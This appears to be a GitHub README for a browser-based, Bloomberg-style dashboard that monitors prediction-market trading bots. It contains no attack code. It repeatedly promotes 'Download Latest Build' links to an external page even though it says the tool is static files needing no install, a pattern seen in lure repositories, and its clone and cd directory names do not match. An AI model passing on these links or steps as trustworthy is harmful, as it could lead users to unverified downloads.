# Apex Meridian Terminal - Trading Dashboard 2026

> A browser-based trading dashboard influenced by Bloomberg Terminal visual structure, built to help monitor and steer autonomous prediction market trading bots in real time.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaaclabs2000/apex-meridian-bot-terminal?style=flat-square)](https://github.com/isaaclabs2000/apex-meridian-bot-terminal)

---

<p align="center">
  <a href="https://isaaclabs2000.github.io/apex-meridian-bot-terminal/">
    <img src="https://img.shields.io/badge/Download-Apex%20Meridian%20Terminal%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Meridian Terminal">
  </a>
</p>

> **[Direct Download - Apex Meridian Terminal v1.0](https://isaaclabs2000.github.io/apex-meridian-bot-terminal/)**

---

[Download Latest Build](https://isaaclabs2000.github.io/apex-meridian-bot-terminal/)

---

## Overview

Apex Meridian Terminal delivers a professional monitoring surface for operators running autonomous prediction market bots. Its layout echoes the packed, multi-pane feel of Bloomberg Terminal environments, bringing market signals, bot health, position details, and performance metrics into one place so users do not need to jump between separate tools.

The project is aimed at traders and teams that want a centralized view of automated trading activity. Instead of managing scattered terminals or custom scripts, users can watch bot behavior, tune parameters, and follow market movement from a single workspace. Because the interface runs fully in the browser, it only needs a modern web client and no heavyweight local installation.

---

## Capabilities

- Bloomberg Terminal-style multi-panel arrangement for high information density
- Live observation of autonomous prediction market trading bots
- Panels for bot state, open positions, and market signals
- Thin web interface with no server-side dependencies
- Modular panel architecture for future customization or swapping data sources
- Status cues for bot activity, executed trades, and market movement
- Clear split between the presentation layer and trading logic

---

## Setup

Clone the repository to your local machine:

```bash
git clone https://github.com/isaaclabs2000/apex-meridian-bot-terminal.git
cd apex-meridian-terminal
```

Open the main HTML file directly in any modern browser:

```bash
open index.html
```

No build tools, package managers, or server runtimes are required. The dashboard operates entirely from static files.

---

## How to Use

1. Open `index.html` in your browser.
2. The dashboard will load with sample data panels.
3. Connect your prediction market bot's data feed by editing the configuration block (see Configuration section).
4. Panels update automatically as new data arrives from your bots.

For a quick demonstration, the dashboard includes mock data that shows the layout and flow of information. Swap in your bot's output endpoint as the data source URL when you are ready for live use.

---

## Configuration

Settings live in a dedicated JavaScript configuration object near the top of `index.html`. Find the `CONFIG` block, where you can define:

- Data source endpoints for bot status feeds
- Refresh interval for panel updates
- Panel visibility toggles

Example configuration structure:

```javascript
const CONFIG = {
  dataEndpoint: "http://localhost:8080/bot-status",
  refreshInterval: 2000,
  panels: ["market", "positions", "bot-status", "signals"]
};
```

No external configuration files or environment variables are needed.

---

## Requirements

- Any modern web browser (Chrome, Firefox, Edge, or Safari)
- No server or backend required for the dashboard itself
- Your prediction market bots must expose data via HTTP or WebSocket for live operation
- Minimum screen resolution of 1280x720 recommended for optimal panel layout

---

## FAQ

**How do I connect my trading bot?**  
Set the `dataEndpoint` value to your bot's status output. The dashboard expects JSON-formatted data with fields for bot status, positions, and market signals.

**Will the dashboard execute trades?**  
No. Apex Meridian Terminal is for monitoring only. It shows bot activity but does not place orders or interact with markets directly.

**Can I add custom panels?**  
Yes. The dashboard is built around a modular panel system. Each panel is a self-contained HTML section that you can duplicate and adapt on its own.

**How often do panels refresh?**  
The default refresh interval is 2 seconds. You can change it in the configuration block.

**Does this require a Bloomberg subscription?**  
No. The design draws from Bloomberg Terminal aesthetics, but the tool works with any data source you configure.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
